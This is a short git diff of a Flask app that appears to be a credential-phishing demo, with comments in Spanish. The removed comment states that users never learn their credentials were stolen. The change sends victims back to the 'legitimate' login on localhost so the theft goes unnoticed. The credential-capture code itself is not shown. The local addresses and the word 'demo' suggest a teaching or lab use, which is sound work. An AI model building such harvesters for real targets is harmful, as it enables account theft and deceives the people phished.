@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, redirect
 import requests
 import datetime
 
@@ -46,8 +46,8 @@ def login():
 
     log("=" * 52)
 
-    # El usuario siempre ve error — no sabe que sus credenciales fueron robadas
-    return render_template("login.html", error="Credenciales incorrectas. Intente de nuevo.")
+    # Redirige al sitio legitimo para que el flujo parezca normal en la demo
+    return redirect("http://127.0.0.1:5000/login")
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5001, debug=True)
